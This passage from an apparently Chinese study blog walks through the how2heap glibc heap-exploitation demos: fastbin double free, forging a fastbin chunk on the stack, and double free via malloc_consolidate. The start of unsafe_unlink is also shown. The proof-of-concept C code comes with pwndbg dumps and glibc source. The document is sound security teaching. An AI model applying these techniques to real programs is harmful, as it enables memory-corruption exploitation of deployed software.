heap region:       fdStack left redzone:      f1Stack mid redzone:       f2Stack right redzone:     f3Stack partial redzone:   f4Stack after return:      f5Stack use after scope:   f8Global redzone:          f9Global init order:       f6Poisoned by user:        f7Container overflow:      fcArray cookie:            acIntra object redzone:    bbASan internal:           fe==14332==ABORTING</code></pre><p>可以看到检测到一个uaf的漏洞</p><h2 id="0x05-fastbin-dup"><a href="#0x05-fastbin-dup" class="headerlink" title="0x05 fastbin_dup"></a>0x05 fastbin_dup</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序先malloc了3个8byte的chunk</p><pre><code>pwndbg&gt; heap0x602000 FASTBIN {prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x21}0x602020 FASTBIN {prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x21}0x602040 FASTBIN {prev_size = 0, size = 33, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x20fa1}0x602060 PREV_INUSE {prev_size = 0, size = 135073, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0}pwndbg&gt; x/20gx 0x6020000x602000:    0x0000000000000000    0x0000000000000021 &lt;------------ chunk 10x602010:    0x0000000000000000    0x00000000000000000x602020:    0x0000000000000000    0x0000000000000021 &lt;------------ chunk 20x602030:    0x0000000000000000    0x00000000000000000x602040:    0x0000000000000000    0x0000000000000021 &lt;------------ chunk 30x602050:    0x0000000000000000    0x00000000000000000x602060:    0x0000000000000000    0x0000000000020fa1</code></pre><p>之后free了第一个chunk</p><pre><code>pwndbg&gt; x/20gx 0x6020000x602000:    0x0000000000000000    0x0000000000000021 &lt;------------ chunk 1(be freed)0x602010:    0x0000000000000000    0x00000000000000000x602020:    0x0000000000000000    0x0000000000000021 &lt;------------ chunk 20x602030:    0x0000000000000000    0x00000000000000000x602040:    0x0000000000000000    0x0000000000000021 &lt;------------ chunk 30x602050:    0x0000000000000000    0x00000000000000000x602060:    0x0000000000000000    0x0000000000020fa1</code></pre><p>如果这时候再次free第一个chunk(去掉代码内注释)的话, 会提示:</p><pre><code>➜  how2heap git:(master) ✗ ./fastbin_dup This file demonstrates a simple double-free attack with fastbins.Allocating 3 buffers.1st malloc(8): 0xa920102nd malloc(8): 0xa920303rd malloc(8): 0xa92050Freeing the first one...If we free 0xa92010 again, things will crash because 0xa92010 is at the top of the free list.*** Error in `./fastbin_dup&apos;: double free or corruption (fasttop): 0x0000000000a92010 ***======= Backtrace: =========/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fe8490a57e5]/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fe8490ae37a]/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fe8490b253c]./fastbin_dup[0x400762]/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fe84904e830]./fastbin_dup[0x400579]======= Memory map: ========00400000-00401000 r-xp 00000000 08:01 1204504                            /home/a/how2heap/fastbin_dup00600000-00601000 r--p 00000000 08:01 1204504                            /home/a/how2heap/fastbin_dup00601000-00602000 rw-p 00001000 08:01 1204504                            /home/a/how2heap/fastbin_dup00a92000-00ab3000 rw-p 00000000 00:00 0                                  [heap]7fe844000000-7fe844021000 rw-p 00000000 00:00 0 7fe844021000-7fe848000000 ---p 00000000 00:00 0 7fe848e18000-7fe848e2e000 r-xp 00000000 08:01 661172                     /lib/x86_64-linux-gnu/libgcc_s.so.17fe848e2e000-7fe84902d000 ---p 00016000 08:01 661172                     /lib/x86_64-linux-gnu/libgcc_s.so.17fe84902d000-7fe84902e000 rw-p 00015000 08:01 661172                     /lib/x86_64-linux-gnu/libgcc_s.so.17fe84902e000-7fe8491ee000 r-xp 00000000 08:01 664598                     /lib/x86_64-linux-gnu/libc-2.23.so7fe8491ee000-7fe8493ee000 ---p 001c0000 08:01 664598                     /lib/x86_64-linux-gnu/libc-2.23.so7fe8493ee000-7fe8493f2000 r--p 001c0000 08:01 664598                     /lib/x86_64-linux-gnu/libc-2.23.so7fe8493f2000-7fe8493f4000 rw-p 001c4000 08:01 664598                     /lib/x86_64-linux-gnu/libc-2.23.so7fe8493f4000-7fe8493f8000 rw-p 00000000 00:00 0 7fe8493f8000-7fe84941e000 r-xp 00000000 08:01 664570                     /lib/x86_64-linux-gnu/ld-2.23.so7fe8495ff000-7fe849602000 rw-p 00000000 00:00 0 7fe84961c000-7fe84961d000 rw-p 00000000 00:00 0 7fe84961d000-7fe84961e000 r--p 00025000 08:01 664570                     /lib/x86_64-linux-gnu/ld-2.23.so7fe84961e000-7fe84961f000 rw-p 00026000 08:01 664570                     /lib/x86_64-linux-gnu/ld-2.23.so7fe84961f000-7fe849620000 rw-p 00000000 00:00 0 7fff56009000-7fff5602a000 rw-p 00000000 00:00 0                          [stack]7fff56128000-7fff5612b000 r--p 00000000 00:00 0                          [vvar]7fff5612b000-7fff5612d000 r-xp 00000000 00:00 0                          [vdso]ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall][1]    14401 abort (core dumped)  ./fastbin_dup</code></pre><p>这是因为glibc内在free同一个chunk时做了处理:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">   (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由于fastbins是一个后进先出(LIFO)的结构, 处于链表头的总是最先被free的chunk</p><p>因此我们先free第一个chunk, 之后free第二个chunk, 接着就可以再次free第一个chunk了</p><p>因为glibc并未对后续堆块进行检查, 仅检查了最前面的chunk</p><pre><code>➜  how2heap git:(master) ✗ ./fastbin_dup                 This file demonstrates a simple double-free attack with fastbins.Allocating 3 buffers.1st malloc(8): 0x11010102nd malloc(8): 0x11010303rd malloc(8): 0x1101050Freeing the first one...If we free 0x1101010 again, things will crash because 0x1101010 is at the top of the free list.So, instead, we&apos;ll free 0x1101030.Now, we can free 0x1101010 again, since it&apos;s not the head of the free list.Now the free list has [ 0x1101010, 0x1101030, 0x1101010 ]. If we malloc 3 times, we&apos;ll get 0x1101010 twice!1st malloc(8): 0x11010102nd malloc(8): 0x11010303rd malloc(8): 0x1101010</code></pre><p>加上注释以后可以看到, 在free了两次第一个堆块(0x1101010)后, fastbins的链表中保存了两次这个chunk</p><p>按照free的先后顺序, 即0x1101010 -&gt; 0x1101030 -&gt; 0x1101010</p><p>在pwndbg中可以看到:</p><pre><code>pwndbg&gt; fastbins fastbins0x20: 0x602000 —▸ 0x602020 ◂— 0x6020000x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0</code></pre><p>此时, 如果我们malloc三个chunk, 将会从fastbins的链表中返回chunk</p><p>可以在输出结果中看到0x1101010这个chunk被返回了两次</p><p>同样的, 如果加上内存检测参数<code>-fsanitize=address -g</code>会提示有double-free漏洞</p><h2 id="0x06-fastbin-dup-into-stack"><a href="#0x06-fastbin-dup-into-stack" class="headerlink" title="0x06 fastbin_dup_into_stack"></a>0x06 fastbin_dup_into_stack</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var = <span class="number">0x21</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(b, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"CCCCCCCC"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(9) %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(9) %p points to %s\n"</span>, b, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(9) %p points to %s\n"</span>, c, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then freeing another one %p.\n"</span>, b);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p again.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 4 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    *d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4nd malloc(9) %p points to %p\n"</span>, d, &amp;d);</span><br><span class="line">    <span class="keyword">char</span> *e = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(e, <span class="string">"EEEEEEEE"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"5nd malloc(9) %p points to %s\n"</span>, e, e);</span><br><span class="line">    <span class="keyword">char</span> *f = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(f, <span class="string">"FFFFFFFF"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"6rd malloc(9) %p points to %s\n"</span>, f, f);</span><br><span class="line">    <span class="keyword">char</span> *g = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(g, <span class="string">"GGGGGGGG"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"7th malloc(9) %p points to %s\n"</span>, g, g);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序展示了如何通过修改fd指针在栈上伪造一个free chunk</p><p>在malloc了3个chunk并且复制了3个字符串进去后:</p><pre><code>pwndbg&gt; x/20gx 0x6020000x602000:    0x0000000000000000    0x00000000000000210x602010:    0x4141414141414141    0x00000000000000000x602020:    0x0000000000000000    0x00000000000000210x602030:    0x4242424242424242    0x00000000000000000x602040:    0x0000000000000000    0x00000000000000210x602050:    0x4343434343434343    0x00000000000000000x602060:    0x0000000000000000    0x0000000000020fa1</code></pre><p>对第一个chunk double free后:</p><pre><code>pwndbg&gt; x/20gx 0x6020000x602000:    0x0000000000000000    0x00000000000000210x602010:    0x0000000000602020    0x00000000000000000x602020:    0x0000000000000000    0x00000000000000210x602030:    0x0000000000602000    0x00000000000000000x602040:    0x0000000000000000    0x00000000000000210x602050:    0x4343434343434343    0x00000000000000000x602060:    0x0000000000000000    0x0000000000020fa1pwndbg&gt; fastbins fastbins0x20: 0x602000 —▸ 0x602020 ◂— 0x6020000x30: 0x0</code></pre><p>接着malloc一个chunk, 内容为栈地址(stack_var - 0x08)</p><pre><code>pwndbg&gt; x/20gx 0x6020000x602000:    0x0000000000000000    0x00000000000000210x602010:    0x00007fffffffdd90    0x00000000000000000x602020:    0x0000000000000000    0x00000000000000210x602030:    0x0000000000602000    0x00000000000000000x602040:    0x0000000000000000    0x00000000000000210x602050:    0x4343434343434343    0x00000000000000000x602060:    0x0000000000000000    0x0000000000020fa1</code></pre><p>可以看到, 第一个chunk被重新分配, 并保存了我们的栈顶地址(rsp)</p><p>这也是为什么stack_var被设置为0x21(0x20也可以), 设置一个和之前chunk大小相同的size</p><pre><code>pwndbg&gt; stack00:0000│ rsp  0x7fffffffdd90 ◂— 0x001:0008│      0x7fffffffdd98 ◂— 0x21 /* &apos;!&apos; */02:0010│      0x7fffffffdda0 —▸ 0x602010 —▸ 0x7fffffffdd90 ◂— 0x0pwndbg&gt; x/20gx 0x7fffffffdd900x7fffffffdd90:    0x0000000000000000    0x0000000000000021 &lt;------------------ fake chunk0x7fffffffdda0:    0x0000000000602010    0x0000000000602010</code></pre><p>glibc 在执行分配操作时，若块的大小符合 fast bin，则会在对应的 bin 中寻找合适的块，此时 glibc 将根据候选块的 size 字段计算出 fastbin 索引，然后与对应 bin 在 fastbin 中的索引进行比较，如果二者不匹配，则说明块的 size 字段遭到破坏。所以需要 fake chunk 的 size 字段被设置为正确的值。</p><p>glibc 检查代码:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      [...]</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">              [...]</span><br><span class="line">            &#125;</span><br><span class="line">            [...]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于我们对第一个chunk进行了两次free, 那么在第四次malloc并把栈地址输入进去的时候, 伪造的chunk实际上替代了第二次free第一个malloc的chunk</p><p>这时候的fastbins链表是一个正常的fastbins链表(没有double free的bin)</p><pre><code>pwndbg&gt; fastbins fastbins0x20: 0x602020 —▸ 0x602000 —▸ 0x7fffffffdd90 —▸ 0x602010 ◂— 0x0</code></pre><p>可以看到伪造的chunk已经放在fastbins里了</p><p>我们这时再进行两次malloc, 取出第一次和第二次free的chunk, 将伪造的chunk放在表头</p><pre><code>pwndbg&gt; fastbins fastbins0x20: 0x7fffffffdd90 —▸ 0x602010 ◂— 0x0</code></pre><p>然后malloc一次, 即可在fake chunk处分配内存</p><pre><code>pwndbg&gt; x/20gx 0x7fffffffdd90 (stack)0x7fffffffdd90:    0x0000000000000000    0x00000000000000210x7fffffffdda0:    0x4747474747474747    0x00000000006020100x7fffffffddb0:    0x0000000000602030    0x00000000006020500x7fffffffddc0:    0x0000000000602030    0x00000000006020100x7fffffffddd0:    0x00007fffffffdda0    0x3bfa61ab402a0700</code></pre><h2 id="0x07-fastbin-dup-consolidate"><a href="#0x07-fastbin-dup-consolidate" class="headerlink" title="0x07 fastbin_dup_consolidate"></a>0x07 fastbin_dup_consolidate</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(p1, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(p2, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(p4, <span class="string">"CCCCCCC"</span>);</span><br><span class="line">    <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(p5, <span class="string">"DDDDDDDD"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, p4, p5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序malloc了两个0x10的chunk</p><pre><code>pwndbg&gt; x/20gx 0x6020000x602000:    0x0000000000000000    0x0000000000000021 &lt;--------------------- p10x602010:    0x4141414141414141    0x00000000000000000x602020:    0x0000000000000000    0x0000000000000021 &lt;--------------------- p20x602030:    0x4242424242424242    0x00000000000000000x602040:    0x0000000000000000    0x0000000000020fc1</code></pre><p>free p1</p><pre><code>pwndbg&gt; x/20gx 0x6020000x602000:    0x0000000000000000    0x00000000000000210x602010:    0x0000000000000000    0x00000000000000000x602020:    0x0000000000000000    0x00000000000000210x602030:    0x4242424242424242    0x00000000000000000x602040:    0x0000000000000000    0x0000000000020fc1pwndbg&gt; fastbins fastbins0x20: 0x602000 ◂— 0x0</code></pre><p>malloc p3(0x500)</p><pre><code>pwndbg&gt; x/20gx 0x6020000x602000:    0x0000000000000000    0x00000000000000210x602010:    0x00007ffff7dd1b88    0x00007ffff7dd1b880x602020:    0x0000000000000020    0x00000000000000200x602030:    0x4242424242424242    0x00000000000000000x602040:    0x0000000000000000    0x0000000000000411pwndbg&gt; fastbins fastbins0x20: 0x0pwndbg&gt; smallbins smallbins0x20: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000</code></pre><p>可以看到, malloc了一个0x400的大chunk后, fastbins中保存的p1的chunk消失了</p><p>出现在了smallbins中, 并且chunk p2的size和prev size都被修改了</p><p>large chunk的分配机制:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>翻译一哈(google机翻233:</p><pre><code>如果这是一个大内存的分配请求(large chunk)，将在继续之前合并fastbins。 虽然在查看是否有可用空间之前杀死所有fastbins可能看起来过多，但这可以避免通常与fastbins相关的碎片问题。此外，在实践中，程序往往会有小型或大型请求，但混合次数较少，因此在大多数程序中通常不会调用整合。 而在其他情况下经常调用的程序往往会碎片化。</code></pre><p>当分配large chunk的时候, 首先根据chunk的大小获得对应的large bin的index</p><pre><code>malloc_state结构体中`mchunkptr bins[NBINS * 2 - 2];`保存了除了fastbin的其他bin即small bin, large bin, unsorted bin, 都使用的是双向链表下标1是unsorted bin, 2~63是small bin, 64~126是large bin</code></pre><p>之后呢, 判断fastbins中是否包含chunk, 如果有的话会调用malloc_consolidate合并fastbins的chunk, 加入到unsorted bins中</p><p>由于我们分配的是一个0x400大小的chunk, 适合small bin( &lt; 512byte)</p><p>所以会从unsorted bin中返回到small bin</p><p>由于此时p1 chunk不在fastbins的表头, 可以再次free</p><pre><code>pwndbg&gt; x/20gx 0x6020000x602000:    0x0000000000000000    0x00000000000000210x602010:    0x0000000000000000    0x00007ffff7dd1b880x602020:    0x0000000000000020    0x00000000000000200x602030:    0x4242424242424242    0x00000000000000000x602040:    0x0000000000000000    0x0000000000000411pwndbg&gt; fastbins fastbins0x20: 0x602000 ◂— 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0pwndbg&gt; smallbins smallbins0x20 [corrupted]FD: 0x602000 ◂— 0x0BK: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000</code></pre><p>一个在fastbins中, 一个在smallbins中. malloc一次并放入字符串CCCCCCC</p><pre><code>0x602000:    0x0000000000000000    0x00000000000000210x602010:    0x0043434343434343    0x00007ffff7dd1b880x602020:    0x0000000000000020    0x00000000000000200x602030:    0x4242424242424242    0x00000000000000000x602040:    0x0000000000000000    0x0000000000000411</code></pre><p>第二次malloc, 放入字符串DDDDDDD</p><pre><code>pwndbg&gt; x/20gx 0x6020000x602000:    0x0000000000000000    0x00000000000000210x602010:    0x4444444444444444    0x00007ffff7dd1b880x602020:    0x0000000000000020    0x00000000000000210x602030:    0x4242424242424242    0x00000000000000000x602040:    0x0000000000000000    0x0000000000000411</code></pre><p>可以看到两次malloc并修改的实际上是同一个chunk</p><h2 id="0x08-unsafe-unlink"><a href="#0x08-unsafe-unlink" class="headerlink" title="0x08 unsafe_unlink"></a>0x08 unsafe_unlink</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">// not fastbins</span></span><br><span class="line">    <span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">    <span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span></span><br><span class="line">    chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">    chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span 